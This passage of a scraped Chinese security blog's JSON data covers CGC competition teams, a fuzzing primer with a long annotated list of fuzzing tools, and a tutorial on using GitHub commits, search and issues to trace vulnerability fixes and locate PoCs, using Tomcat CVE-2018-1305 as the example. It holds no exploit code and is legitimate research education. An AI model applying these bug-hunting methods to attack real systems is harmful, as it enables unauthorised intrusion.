Song。伯克利大学的研究团队在应用程序分析，特别是二进制分析领域始终处于世界领先的水平，该团队开源的分析系统很值得研究。http://bitblaze.cs.berkeley.edu/ ForAllSecure （Pittsburgh, Pa.）：ForAllSecure是卡内基梅隆大学David Brumley教授所创办的公司，团队成员也多来自于卡内基梅隆大学的CyLab（David Brumley教授指导的实验室）。著名的PPP战队正是出自CyLab。除此之外，CyLab在二进制分析领域的研究也是处于全球领先的地位，与伯克利的团队类似，CyLab也有自己研发的二进制分析平台 BAP（Binary Analysis Platform。https://github.com/BinaryAnalysisPlatform TECHx （Charlottesville, Va.）: GrammaTech是一家专注于二进制分析的公司，此次与维吉尼亚大学组队参加CGC竞赛，开发了PEASOUP（Preventing Exploits of Software Of Uncertain Provenance）系統。相关论文:http://www.grammatech.com/research/technologies/peasoup/publications CSDS （Moscow, Idaho）：有爱德华大学教授Jim Alves-Foss及其博士后研究员 Jia Song 组成的两人战队。是CGC比赛中唯一重新开发整套工具的队伍。 DeepRed （Arlington, Va.）：Raytheon为美国公司，该团队在memory领域有一些特別的研究成果，队名源自于 IBM 的 Deep Blue。 disekt（Athens, Ga.）：disekt是一只CTF战队，共有四位成员。该团队对于VM系统有深入研究，12年有发表QEMU漏洞，14年发表VM Detection技术，此外还有ROP相关研究成果。（ROP Detection at Shmoocon 2014 ） Shellphish（Santa Barbara, Calif.）：团队由加利福尼亚大学圣芭芭拉分校的学生组成。Shellphish 不仅是传统的CTF强队，在学术研究方面也具备深厚的功力，团队指导教授之一的 Christopher Kruegel，在二进制分析领域相当有名。该团队开发的Angr系统，是非常优秀的分析平台。http://angr.io/ 參考文獻 https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/running-the-vm.md http://blog.trailofbits.com/category/program-analysis/","categories":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://maskhed.github.io/categories/二进制安全/"}],"tags":[{"name":"CGC","slug":"CGC","permalink":"http://maskhed.github.io/tags/CGC/"}]},{"title":"Fuzzing技术总结与工具列表","slug":"Fuzzing技术总结与工具列表","date":"2018-10-26T16:11:23.000Z","updated":"2018-11-10T03:48:24.422Z","comments":true,"path":"2018/10/27/Fuzzing技术总结与工具列表/","link":"","permalink":"http://maskhed.github.io/2018/10/27/Fuzzing技术总结与工具列表/","excerpt":"","text":"版权声明：本文为博主原创文章，未经博主允许不得转载。https://blog.csdn.net/wcventure/article/details/82085251 首先推荐阅读2018年computing Surveys 的《Fuzzing: Art, Science, and Engineering》https://github.com/wcventure/wcventure/blob/master/Paper/Fuzzing_Art_Science_and_Engineering.pdf其次推荐阅读2018年Cybersecurity 的 《Fuzzing: a survey》https://www.researchgate.net/publication/325577316_Fuzzing_a_survey里面对fuzzing技术和fuzzing工具有详细的介绍。 一、什么是Fuzzing？ Fuzz本意是“羽毛、细小的毛发、使模糊、变得模糊”，后来用在软件测试领域，中文一般指“模糊测试”，英文有的叫“Fuzzing”，有的叫“Fuzz Testing”。本文用fuzzing表示模糊测试。 Fuzzing技术可以追溯到1950年，当时计算机的数据主要保存在打孔卡片上，计算机程序读取这些卡片的数据进行计算和输出。如果碰到一些垃圾卡片或一些废弃不适配的卡片，对应的计算机程序就可能产生错误和异常甚至崩溃，这样，Bug就产生了。所以，Fuzzing技术并不是什么新鲜技术，而是随着计算机的产生一起产生的古老的测试技术。 Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。随着计算机的发展，Fuzzing技术也在不断发展。 二、Fuzzing有用么？ Fuzzing是模糊测试，顾名思义，意味着测试用例是不确定的、模糊的。 计算机是精确的科学和技术，测试技术应该也是一样的，有什么的输入，对应什么样的输出，都应该是明确的，怎么会有模糊不确定的用例呢？这些不确定的测试用例具体会有什么作用呢？ 为什么会有不确定的测试用例，我想主要的原因是下面几点： 1、我们无法穷举所有的输入作为测试用例。我们编写测试用例的时候，一般考虑正向测试、反向测试、边界值、超长、超短等一些常见的场景，但我们是没有办法把所有的输入都遍历进行测试的。 2、我们无法想到所有可能的异常场景。由于人类脑力的限制，我们没有办法想到所有可能的异常组合，尤其是现在的软件越来越多的依赖操作系统、中间件、第三方组件，这些系统里的bug或者组合后形成的bug，是我们某个项目组的开发人员、测试人员无法预知的。 3、Fuzzing软件也同样无法遍历所有的异常场景。随着现在软件越来越复杂，可选的输入可以认为有无限个组合，所以即使是使用软件来遍历也是不可能实现的，否则你的版本可能就永远也发布不了。Fuzzing技术本质是依靠随机函数生成随机测试用例来进行测试验证，所以是不确定的。 这些不确定的测试用例会起到我们想要的测试结果么？能发现真正的Bug么？ 1、Fuzzing技术首先是一种自动化技术，即软件自动执行相对随机的测试用例。因为是依靠计算机软件自动执行，所以测试效率相对人来讲远远高出几个数量级。比如，一个优秀的测试人员，一天能执行的测试用例数量最多也就是几十个，很难达到100个。而Fuzzing工具可能几分钟就可以轻松执行上百个测试用例。 2、Fuzzing技术本质是依赖随机函数生成随机测试用例，随机性意味着不重复、不可预测，可能有意想不到的输入和结果。 3、根据概率论里面的“大数定律”，只要我们重复的次数够多、随机性够强，那些概率极低的偶然事件就必然会出现。Fuzzing技术就是大数定律的典范应用，足够多的测试用例和随机性，就可以让那些隐藏的很深很难出现的Bug成为必然现象。 目前，Fuzzing技术已经是软件测试、漏洞挖掘领域的最有效的手段之一。Fuzzing技术特别适合用于发现0 Day漏洞，也是众多黑客或黑帽子发现软件漏洞的首选技术。Fuzzing虽然不能直接达到入侵的效果，但是Fuzzing非常容易找到软件或系统的漏洞，以此为突破口深入分析，就更容易找到入侵路径，这就是黑客喜欢Fuzzing技术的原因。 三、基于生成和基于编译的Fuzzing算法？* Fuzzing引擎算法中，测试用例的生成方式主要有2种：1）基于变异：根据已知数据样本通过变异的方法生成新的测试用例；2）基于生成：根据已知的协议或接口规范进行建模，生成测试用例；一般Fuzzing工具中，都会综合使用这两种生成方式。 基于变异的算法核心要求是学习已有的数据模型，基于已有数据及对数据的分析，再生成随机数据做为测试用例。 四、state-of-the-art AFL AFL就是著名的基于变异的Fuzzer。以下有一些关于state-of-the-art AFL的资料 american fuzzy lop (2.52b) http://lcamtuf.coredump.cx/afl/ AFL内部实现细节小记 http://rk700.github.io/2017/12/28/afl-internals/ afl-fuzz技术白皮书 https://blog.csdn.net/gengzhikui1992/article/details/50844857 如何使用AFL进行一次完整的fuzz过程 https://blog.csdn.net/abcdyzhang/article/details/53487683 AFL(American Fuzzy Lop)实现细节与文件变异 https://paper.seebug.org/496/ fuzz实战之libfuzzer https://www.secpulse.com/archives/71898.html 1234- Static analysis- Dynamic analysis- Symbolic execution- Fuzzing 12- Generation-based Fuzzing- Mutation-based Fuzzing 123- White box fuzzing- Grey box fuzzing- Black box fuzzing 1- Fuzzing技术中的关键 1- Fuzzing 中 1- 至今fuzzing工具文献的引用关系，Fuzzing工具的分类和历史 1- Fuzzing 工具之调研，还有一张很好的整理后的图表 最后，再整理一下部分开源fuzzing工具的列表原文来自：[https://www.peerlyst.com/posts/resource-open-source-fuzzers-list]，并增加2018年最新的诸如CollAFL和SnowFuzz等工具 开源Fuzzers工具 Fuzzing的线束或框架 其它 Fuzzers 工具是免费的，但是和开源比不值得一提 Fuzzing的有效超载 博客将帮助你更好的了解Fuzz 其它关于Fuzzing博客或资源 商业Fuzzers工具 一、开源Fuzzers CollAFLhttp://chao.100871.net/papers/oakland18.pdf路径敏感的Fuzzer，解决了AFL中bitmap路径冲突的问题。并提出了一种选择seed的策略，能更快提高覆盖率。 SnowFuzzhttps://arxiv.org/pdf/1708.08437.pdf VUzzerhttp://www.cs.vu.nl//~giuffrida/papers/vuzzer-ndss-2017.pdf基于应用感知的自进化模糊工具。在这篇文章中，我们提出一个应用感知的进化模糊策略（不需要以前的知识应用或格式输入）。为了最小化地覆盖并扩展更深的路径，我们利用基于静态和动态分析的控制以及数据流功能，来推断应用程序的基本属性。与Application-agnostic方法相比，这可以更快地生成有趣的输入。我们实行我们的模糊策略在VUzzer上，并且用三种不同的数据评估它：DARPA的大挑战二进制文件（CGC）、一组真实的应用程序（二进制输入解析器）和最近发布的LAVA数据集。 Afl-fuzz（American fuzzy lop）http://lcamtuf.coredump.cx/afl/Afl-fuzz是一种基于面向安全的模糊测试工具，它采用了一种新型的方式（编译时检测和遗传算法），来自动发掘干净的、有趣的测试案例，即在目标二进制中触发新的内部状态。这基本上改善了模糊代码的功能覆盖。该工具生成的简洁的合成语料库也可以用来传播其它更多的劳动型或资源密集型测试方案。与其他仪器化的模糊工具相比，afl-fuzz是以实用性而被设计的：它具有适度的性能开销，采用了多种高效的模糊战略，和努力最小化的技巧，基本上不需要配置，并且能够无缝处理复杂的、真实世界案例，以及常见的图像分析或文件压缩等。 Filebuster一个非常快速和灵活的网络模糊工具 TriforceAFLAFL / QEMU 模糊器具有全系统的仿真。这是AFL的修补版本，支持使用QEMU的全系统模糊测试。它所包含的QEMU已经更新，允许在运行x86_64的系统仿真器时进行分支机构跟踪。它也添加了额外的指令来启动AFL的forkserver，进行模糊设置，并标记测试用例的启动和停止。 Nightmare:https://github.com/joxeankoret/nightmare一个具有web管理的分布式模糊测试套件。 GrrDECREE二进制的高吞吐量模糊器和仿真器 Randy:http://ptrace-security.com/blog/randy-random-based-fuzzer-in-python/Python中的基于随机的模糊工具 IFuzzer一个进化型的翻译模糊器 Dizzy:https://github.com/ernw/dizzy基于python的模糊框架：(1) 可以发送到L2以及上层（TCP / UDP / SCTP）(2)能够处理奇长度分组字段（无需匹配字节边界，因此即使单个标志或7位长字也可以表示和模糊）(3) 非常容易的协议定义语法(4) 能够做多包状态的完全模糊，能够使用接收到的目标数据作为响应 Address Sanitizer:https://github.com/Google/sanitizers地址Sanitizer、线Sanitizer、记忆Sanitizer Diffy:https://github.com/twitter/diffy使用Diffy查找您的服务中的潜在错误 Wfuzz:https://github.com/xmendez/wfuzzWeb应用程序HTTP://www.edge-security.com/wfuzz.php Go-fuzz:https://github.com/Google/gofuzz基于放弃的模糊测试 Sulley:https://github.com/OpenRCE/sulleySulley是一个积极开发的模糊引擎和模糊测试框架，由多个可扩展组件组成。Sulley（IMHO）超过了此前公布的大所属模糊技术、商业和公共领域的能力。框架的目标是不仅是可以简化数据表示，而且也可以简化数据传输和仪表。Sulley是以 Monsters Inc.的生物来命名的，因为，他是模糊的。写在python内的。 Sulley_l2:http://ernw.de/download/sulley_l2.tar.bz2有些人可能记得2008年发布的sulley_l2，它是sulley模糊框架的修改版本，增强了第2层发送功能和一堆（L2）模糊脚本。所有的blinking, rebooting, mem-corrupting引起了我们的一些关注。从那以后，我们继续写和使用这些模糊脚本，所以它的洞集合增长了。 CERT Basic Fuzzing Framework (BFF)For linux, OSXhttps://github.com/CERTCC-Vulnerability-Analysis/certfuzzhttp://www.cert.org/vulnerability-analysis/tools/bff.cfmcert基本模糊框架（BFF）是一个软件测试工具，它用于在linux和mac os x平台上运行的应用程序中寻找漏洞。BFF对消耗文件输入的软件执行突变性的模糊测试。（突变性模糊测试是采取形式良好的输入数据并以各种方式破坏它的行为，寻找导致崩溃的情况。）BFF自动收集导致了软件以独特方式使测试用例崩溃，以及利用崩溃来调试信息。BFF的目标是去最小化软件供应商和安全研究人员通过模糊测试有效地发现和分析发现的安全漏洞过程中所需要的努力。 CERT Failure Observation Engine (FOE)For windowshttp://www.cert.org/vulnerability-analysis/tools/foe.cfmhttps://github.com/CERTCC-Vulnerability-Analysis/certfuzzThe cert Failure Observation Engine (FOE) 是一个软件测试工具，它被用于在Windows平台上运行的应用程序中发现漏洞。FOE在消耗文件输入的软件上执行突变模糊测试。（突变性模糊测试是采取形式良好的输入数据并以各种方式破坏它的行为，寻找导致崩溃的情况。）FOE自动收集导致了软件以独特方式使测试用例崩溃，以及利用崩溃来调试信息。FOE的目标是去最小化软件供应商和安全研究人员通过模糊测试有效地发现和分析发现的安全漏洞过程中所需要的努力。 DranzerFor ActiveX Controls.https://github.com/CERTCC-Vulnerability-Analysis/dranzerDranzer是一个工具，使用户能够检查有效的技术，它用于模糊测试ActiveX控件 Radamsaa general purpose fuzzerhttps://github.com/aoh/radamsaRadamsa是一个用于鲁棒性测试的测试用例生成器，也称为fuzzer。它可以用来测试一个程序是否可以承受格式错误以及潜在的恶意输入。它通过制造文件来工作（有趣的不同于通常给定的文件），然后将修改的文件提供给Target程序，或者这样或通过一些脚本。radamsa的主要卖点（而不是其他的模糊器）是：它是非常容易在大多数机器上运行，而且很容易从命令行脚本，这已经被用来找到程序中的一系列安全问题，而且你可能现在正在使用。 zzufApplication fuzzerhttps://github.com/samhocevar/zzufzzuf是一个透明的应用程序输入模糊器。 它的工作原理是截取文件操作并更改程序输入中的随机位。zzuf的行为是确定性的，使得它很容易再现错误。 有关如何使用zzuf的说明和示例，请参阅手册页和网站http://caca.zoy.org/wiki/zzuf Backfuzzhttps://github.com/localh0t/backfuzzBackfuzz是一个用python写成的有着不同协议（FTP，HTTP，IMAP等）的模糊工具。因为一般的想法是这个脚本有几个预定义的功能，所以谁想要编写自己的插件（为另一个协议）就可以在一些行这样做。 KEMUfuzzerhttps://github.com/jrmuizel/kemufuzzerKEmuFuzzer是一个基于仿真或直接本地执行测试系统虚拟机的工具。 目前KEmuFuzzer支持：BHOCS，QEMU，VMware和virtualbox。 Pathgrindhttps://github.com/codelion/pathgrindPathgrind使用基于路径的动态分析来fuzz linux / unix二进制。 它是基于valgrind被写在python内的。 Wadi-fuzzerhttps://www.sensepost.com/blog/2015/wadi-fuzzer/ https://gitlab.sensepost.com/saif/DOM-FuzzerWadi是基于web浏览器语法的模糊器。 这个语法用于描述浏览器应该如何处理Web内容，Wadi转向并使用语法来打破浏览器。Wadi是一个Fuzzing模块，用于NodeFuzz fuzzing Harness并利用AddressSanitizer（ASan）在Linux和Mac OSX上进行测试。万维网联盟（W3C）是一个国际组织，它开发开放标准以确保Web的长期增长。 W3C允许我们搜索语法并在我们的测试用例中使用。 LibFuzzer, Clang-format-fuzzer, clang-fuzzerhttp://llvm.org/docs/LibFuzzer.htmlhttp://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-format/fuzzer/ClangFormatFuzzer.cpp?view=markuphttp://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-fuzzer/ClangFuzzer.cpp?view=markup我们在LibFuzzer上实现了两个模糊器：clang-format-fuzzer和clang-fuzzer。Clang格式大多是一个词法分析器，所以给它随机字节格式是会完美运行的，但也伴随着超过20个错误。然而Clang不仅仅是一个词法分析器，给它随机字节时几乎没有划伤其表面，所以除了测试随机字节，我们还在令牌感知模式中模糊了Clang。两种模式中都发现了错误; 其中一些以前被AFL检测到，另一些则不是：我们使用AddressSanitizer运行这个模糊器，结果发现一些错误在没有它的情况下不容易被发现。 Perf-fuzzerhttp://www.eece.maine.edu/~vweaver/projects/perf_events/validation/https://github.com/deater/perf_event_testshttp://web.eece.maine.edu/~vweaver/projects/perf_events/fuzzer/用于Linux perf_event子系统的测试套件 HTTP/2 Fuzzerhttps://github.com/c0nrad/http2fuzzHTTP2模糊器内置于Golang。 QuickFuzzhttp://quickfuzz.org/QuickFuzz是一个语法模糊器，由QuickCheck，模板Haskell和Hackage的特定库生成许多复杂的文件格式，如Jpeg，Png，Svg，Xml，Zip，Tar和更多！ QuickFuzz是开源的（GPL3），它可以使用其他错误检测工具，如zzuf，radamsa，honggfuzz和valgrind。 SymFuzzhttps://github.com/maurer/symfuzzhttp://ieeexplore.IEEE.org/xpls/abs_all.jsp?arnumber=7163057摘要？我们提出了一个算法的设计，以最大化数量的bug为黑盒子突变性的模糊给定一个程序和种子的输入。主要的直观性的是利用给定程序 - 种子对的执行轨迹上的白盒符号进行分析，来检测输入的BIT位置之间的依赖性，然后使用这种依赖关系来为该程序种子对计算概率上最佳的突变比率。我们的结果是有希望的：我们发现使用相同的模糊时间，这比8个应用程序中的三个以前的模糊器的平均错误多38.6％。 OFuzzhttps://github.com/sangkilc/ofuzzOFuzz是一个用OCaml编写的模糊平台。 OFuzz目前专注于在* nix平台上运行的文件处理应用程序。 OFuzz的主要设计原则是灵活性：必须容易添加/替换模糊组件（崩溃分类模块，测试用例生成器等）或算法（突变算法，调度算法）。 Bedhttp://www.snake-basket.de/网络协议fuzzer。 BED是一个程序，旨在检查守护程序的潜在缓冲区溢出、格式字符串等。 Neural Fuzzerhttps://cifasis.github.io/neural-fuzzer/神经模糊测试工具是一种实验性模糊器，它被设计使用国家最先进的机器，从一组初始文件学习。 它分为两个阶段：训练和生成。 Pulsarhttps://github.com/hgascon/pulsar协议学习，模拟和状态模糊器Pulsar是一个具有自动协议学习和模拟能力的网络模糊器。该工具允许通过机器学习技术来建模协议，例如聚类和隐马尔可夫模型。这些模型可以用于模拟Pulsar与真实客户端或服务器之间进行通信，这些消息，在一系列模糊原语的结合下，让测试一个未知协议错误的实施在更深的状态协议。 D-bus fuzzer:https://github.com/matusmarhefka/dfuzzerdfuzzer是D-Bus模糊器，是用于通过D-Bus进行通信的模糊测试过程的工具。它可以用于测试连接到会话总线和系统总线守护程序的进程。模糊器为客户端工作，它首先连接到总线守护进程，然后它遍历并模糊测试由D-Bus服务提供的所有方法。 Choronzonhttps://census-labs.com/news/2016/07/20/choronzon-public-release/Choronzon是一个进化型的模糊工具。它试图模仿进化过程，以保持产生更好的结果。 为了实现这一点，它具有评估系统的能力，用以分类哪些模糊文件是有趣的，哪些应该被丢弃。此外，Choronzon是一个基于知识的模糊器。 它使用用户定义的信息来读取和写入目标文件格式的文件。要熟悉Choronzon的术语，您应该考虑每个文件由染色体表示。用户应该描述所考虑的文件格式的基本结构， 优选文件格式的高级概述，而不是描述它的每个细节和方面。那些用户定义的基本结构中的每一个都被认为是基因， 每个染色体包含一个基因树，并且它能够从中构建相应的文件。 Exploitable ‘exploitable’是一个GDB扩展，它会按严重性分类Linux应用程序错误。扩展检查已崩溃的Linux应用程序的状态，并输出攻击者利用底层软件错误获得系统控制有多困难的总结。扩展可以用于为软件开发人员确定bug的优先级，以便他们可以首先解决最严重的bug。该扩展实现了一个名为“exploitable”的GDB命令。 该命令使用启发式来描述当前在GDB中调试的应用程序的状态的可利用性。 该命令旨在用于包含GDB Python API的Linux平台和GDB版本。 请注意，此时命令将无法在核心文件目标上正确运行。 Hodor 我们想设计一个通用的模糊器，可以用来配置使用已知的良好的输入和分隔符，以模糊特定的位置。在一个完全愚钝的模糊器和一些更聪明的东西之间，与实现适当的智能模糊器相比，表现着更少的努力。 BrundleFuzzhttps://github.com/carlosgprado/BrundleFuzzBrundleFuzz是一个用于Windows和Linux的分布式模糊器，使用动态二进制仪器。 Netzobhttps://www.netzob.org/用于通信协议的逆向工程、流量生成和模糊化的开源工具 PassiveFuzzFrameworkOSX该框架用于在内核模式下基于被动内联挂钩机制来模糊OSX内核漏洞。 syntribosOpenStack安全组的Python API安全测试工具 honggfuzzhttp://google.github.io/honggfuzz/一个通用的，易于使用的有趣的分析选项的模糊器。 支持基于代码覆盖率的反馈驱动的模糊测试 dotdotpwnhttp://dotdotpwn.blogspot.com/目录遍历模糊工具 KernelFuzzer跨平台内核Fuzzer框架。DEF CON 24视频：https://www.youtube.com/watch?v=M8ThCIfVXow PyJFuzzPyJFuzz - Python JSON FuzzerPyJFuzz是一个小的、可扩展的和现成可用的框架，用于模糊JSON输入，如移动端点REST API，JSON实现，浏览器，cli可执行和更多。 RamFuzz单个方法参数的模糊器。 EMFFuzzer基于桃树模糊框架的增强的元文件模糊器 js-fuzz一个基于javascript的AFL启发的遗传模糊测试器。 syzkallersyzkaller是一个无监督的、覆盖引导的Linux系统调用模糊器。 二、模糊线束/框架使fuzzer提高： FuzzFlowFuzzflow是来自cisco talos的一个分布式的模糊管理框架，它提供虚拟机管理，模糊作业配、可插拔变异引擎、前/后变形脚本、崩溃收集和可插拔崩溃分析。 fuzzinatorFuzzinator是一个模糊测试框架，可以帮助你自动化任务，它通常需要在一个fuzz会话：运行您最喜欢的测试生成器并将测试用例馈送到测试中的系统，抓住和保存独特的问题，减少失败的测试用例，缓解错误跟踪器中的问题报告（例如，Bugzilla或GitHub），如果需要，定期更新SUT计划多个SUT和发电机，而不会使工作站超载。 Fuzzlabshttps://github.com/DCNWS/FuzzLabsFuzzLabs在一个模块化的模糊框架中，用Python编写。 它使用了令人惊叹的Sulley模糊框架的修改版本作为核心引擎。 FuzzLabs仍在开发中。 Nodefuzzhttps://github.com/attekett/NodeFuzz对于Linux和Mac OSX。 NodeFuzz是一个用于网络浏览器和类似浏览器的应用程序的模糊器。 NodeFuzz背后有两个主要的想法：第一是创建一个简单、快速、不同浏览器的fuzz方法。 第二，有一个线束，可以轻松地扩展与新的测试用例发生器和客户端仪器，无需修改核心。 Grinderhttps://github.com/stephenfewer/grinder对于windows Grinder是一个自动化浏览器的模糊化和大量崩溃管理的系统。 Kittyhttps://github.com/Cisco-sas/kittyKitty是一个开源的模块化和可扩展的模糊框架，使用python编写，灵感来自OpenRCE的Sulley和Michael Eddington（现在是Deja vu Security的）Peach Fuzzer。 Peachhttp://community.peachfuzzer.com/https://github.com/MozillaSecurity/peachPeach是一个SmartFuzzer，能够执行基于生成和基于突变的模糊测试。 三、此外，还有这些免费的但不是开源的fuzzer： SDL MiniFuzz File Fuzzerhttps://www.Microsoft.com/en-us/download/details.aspx?id=21769对于Windows。 SDL MiniFuzz File Fuzzer是一个基本的文件模糊工具，旨在简化非安全开发人员对模糊测试的采用，这些非安全开发人员不熟悉文件模糊工具或从未在当前的软件开发过程中使用它们。 Rfuzzhttp://rfuzz.rubyforge.org/index.htmlRFuzz是一个Ruby库，可以使用快速HttpClient和wicked vil RandomGenerator轻松地从外部测试Web应用程序，它允许普通程序员每天使用先进的模糊技术。 Spikehttp://www.immunitysec.com/downloads/SPIKE2.9.tgzSPIKE是一个API框架，允许你编写模糊器。 Regex Fuzzerhttp://go.microsoft.com/?linkid=9751929DL Regex Fuzzer是一个验证工具，用于帮助测试正则表达式是否存在潜在的拒绝服务漏洞。它包含用指数时间执行的某些子句的正则表达式模式（例如，包含自身重复的重复的子句）可以被攻击者利用来引起拒绝服务（DoS）条件。SDL Regex Fuzzer与SDL过程模板和MSF-Agile + SDL过程模板集成，以帮助用户跟踪和消除其项目中的任何检测到的正则表达式漏洞。 四、博客，将帮助你fuzz更好 Yawml的开始到完成模糊与AFL（一个完整的fuzzjob由foxglovesecurity）http://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/ Fuzz更聪明，更难 - 用afl引发模糊，来自bsidessf2016的引物https://www.peerlyst.com/posts/bsidessf-2016-recap-of-fuzz-smarter-not-harder-an-afl-primer-claus-cramon Fuzzing和afl是一种艺术Fuzzing nginx 和 American Fuzzy Lop您可以在此处的评论或此Google文档中发表建议：https://docs.google.com/document/d/17pZxfs8hXBCnhfHoKfJ7JteGziNB2V_VshsVxmNRx6U/edit?usp=sharing BSidesLisbon 2016主题演讲：智能模糊器革命Windows内核模糊初学者 - Ben Nagy 五、其他Fuzzer博客：循环使用编译器转换的模糊包版谷歌推出了OSS-Fuzz（感谢Dinko Cherkezov） - 一个项目，旨在不断开发开源项目fuzz：OSS-Fuzz现在正在测试中，并即将接受候选开源项目的建议。为了使项目被OSS-Fuzz接受，它需要有一个庞大的用户基础或针对于至关重要的全球IT基础设施，这是一个通用启发式方法，我们有意在这个早期阶段解释。查看更多详情和说明如何在这里申请。一旦项目注册了OSS-Fuzz，它将自动接收到我们的跟踪器中，新报告的错误披露截止于90天后（见此处的详细信息）。 这符合行业的最佳实践，并通过更快地为用户提供补丁来提高最终用户的安全性和稳定性。帮助我们确保这个程序真正服务于开源社区和依赖这个关键软件的互联网，贡献和留下您的反馈在GitHub。 六、商业模糊器 超越安全的暴风雨http://www.beyondsecurity.com/bestorm_and_the_SDL.html管理员编辑：查找更多真棒Peerlyst社区贡献的资源，资源目录在这里。 七、关于浏览器的Fuzzing Skyfire 一种用于Fuzzing的数据驱动的种子生成工具https://www.inforsec.org/wp/?p=2678https://www.ieee-security.org/TC/SP2017/papers/42.pdf 使用libFuzzer fuzz Chrome V8入门指南http://www.4hou.com/info/news/6191.html","categories":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://maskhed.github.io/categories/二进制安全/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://maskhed.github.io/tags/Fuzz/"}]},{"title":"利用Github辅助漏洞分析","slug":"利用Github辅助漏洞分析","date":"2018-10-26T15:58:57.000Z","updated":"2018-11-10T03:45:38.118Z","comments":true,"path":"2018/10/26/利用Github辅助漏洞分析/","link":"","permalink":"http://maskhed.github.io/2018/10/26/利用Github辅助漏洞分析/","excerpt":"","text":"来自于lcatro师傅的分享，原文地址如下：https://github.com/lcatro/How-to-Read-Source-and-Fuzzing/blob/master/1.Github.md 必备工具 Git ,Github 从Github 开始 Github 是代码分享平台,使用Github 能够找到很多开源项目,关于Github 不多做介绍了,下面分享些使用Github 读代码的操作 Github commits Github commits 的功能是用来记录每一次Git 提交代码的信息,里面包含了修改代码的原因,还有修改了哪些代码.Github commits 的功能在这里 点击之后,可以看到很多Git 提交代码的记录 随意点开一条记录,可以看到很多关于这条Commit 的信息 使用Github commits 有一个操作就是:一般来说,部分安全告警或者存在特别严重漏洞的开源项目向外发出通知的时候,往往只是提醒漏洞是影响了哪些版本,什么时候修复,要更新到最新的版本.关于漏洞的详情是很少提及的,甚至PoC 也没有.那么这个时候要怎么去研究漏洞呢?答案是追踪Commit 提交记录 以CVE-2018-1305 为例子,关于绿盟的对外的通告如下(其他通告都大同小异): 里面只有一个邮件通信记录,我们进去看看有什么(https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E) 邮件最下面有个References ,翻译为中文是引用的意思,在这里多插一句话:文章里面的引用一般是拓展阅读或者理论/数据的来源依据,如果读者需要进一步去深入这个文章,引用来源就是最好的入手点**.我们挑其中一个引用的URL 来看看(http://tomcat.apache.org/security-9.html),下面是我挑出的重点信息 圆圈里的意思是漏洞的描述,方框里标明的是其他有用的信息:影响的版本(Affects: 9.0.0.M1 to 9.0.4),最新修复的版本号(Fixed in Apache Tomcat 9.0.5),公开漏洞的时间(11 February 2018),Commit ID (This was fixed in revisions 1823310 and 1824323.). 找到Commit ID ,点进去看看,这个时候就跳转到了Apache 的SVN Commit 记录里边了(http://svn.apache.org/viewvc?view=revision&amp;revision=1823310).[PS:SVN 和Git 都是版本管理工具] 我们可以看到这次修复漏洞修改了哪些代码.但是点进去代码里看,也没有diff ,所以现在回到Git commits 里继续找修复代码的Commit .那么要怎么去找Commit 呢?这个时候,漏洞修复时间就派上用场了. SVN 的Commit 里面有一个Commit 时间(如果没有找到对应的Commit ,就在漏洞报告时间(2018/2/1)到漏洞公开时间(2018/2/23)搜索Commit ) 然后去找Commit ,发现没有找到 这就很迷了,为啥会找不到呢.读者们回到主页,点击这里 这个时候,漏洞影响版本号就派上用场了,嘿嘿嘿 …这里找了个遍都没有找到这个版本,太神奇了,咱们再细细看看漏洞信息哈 ??? 难道tomcat 和apache 是不同的?那我去搜索一下tomcat [PS:Github 搜索有很多很有趣的使用套路,待会和大家分享一个学习漏洞原理的骚操作] 看来找错了开源项目,那就先看看版本分支吧 有些开源项目是有设置不同的版本分支管理的,没有也没关系,那就来找Commit 吧 现在已经定位到了2018/2/6 号的Commit 信息,这里有几个Commit ,一个一个慢慢看吧,搜素的过程就不多说了,最后定位到这两个Commit 修复代码:https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1 测试用例:https://github.com/apache/tomcat/commit/af0c19ffdbe525ad690da4fd7e988c7788d00141 在Git 的Commit 里还能看到Diff ,很容易就知道到底哪些代码被修改过(包括代码注释) 在测试用例里面就可以直接找到PoC 了 Github Search 前面已经说到了如何使用Commit 了,相信读者也已经去秀了一波操作,找到更多关于漏洞修复的细节,上一节有提到,关于Github Search 有一个学习代码的骚操作,当年我就是用这一招弄明白了JavaScript 这种脚本解析引擎的漏洞应该要怎么挖,是不是很想知道到底是啥套路. 在搜索框里输入CVE ,记住,要想挖哪个开源项目就去那个开源项目的Github 上搜素CVE 三个字 结果如上,这个是Code 搜素,搜素出来的结果比较少,咱们切换到Commits 来看看 是不是发现了新世界 :) 洞海无涯苦作舟,用这种方法可以从issus 和Commit 里面学到很多,但是要看懂整个Commit 不只是要看Diff ,还要下载代码到本地一步一步分析漏洞成因 Github Issus Issus 可以看到很多漏洞挖掘的操作,特别是AFL 和libFuzzer 的怎么样使用的,同时在这些提交漏洞的Issus 里还能收集到很多样本,可以直接拿下来到其他的开源项目里继续使用,举个例子,ImageMagick 的Issus :https://github.com/ImageMagick/ImageMagick/issues 这里告诉大家样本在哪儿可以下载,重点是触发的命令是什么,有了这个触发命令之后,我们也可以去照猫画虎拿到AFL 里去跑Fuzzing 啦,美滋滋 在Github 上读代码 一般我都是先在Github 上阅读代码,然后再下载代码到本地Source Insight 继续读.我们有两种方式在Github 上开始阅读 根据文件夹来阅读 简单地来说:关注文件/文件夹的名字 多翻一下目录和文件,总会遇到你感兴趣的一个地方来读 根据敏感函数来阅读 善用Github 的搜索功能,它能够帮你搜索代码或者其他信息 找到了一个感兴趣的地方开始阅读代码之后,Github 的搜素功能可以帮助你向上回溯代码 在网页和普通编辑器阅读源码记得要多使用Ctrl + F ,它能够帮你快速定位当前代码文件的函数定位 Git Clone 这个就不多介绍了,下载代码到本地 Example 去年挖到一个蚂蚁矿机的远程代码执行漏洞,发现这个问题是直接在Github 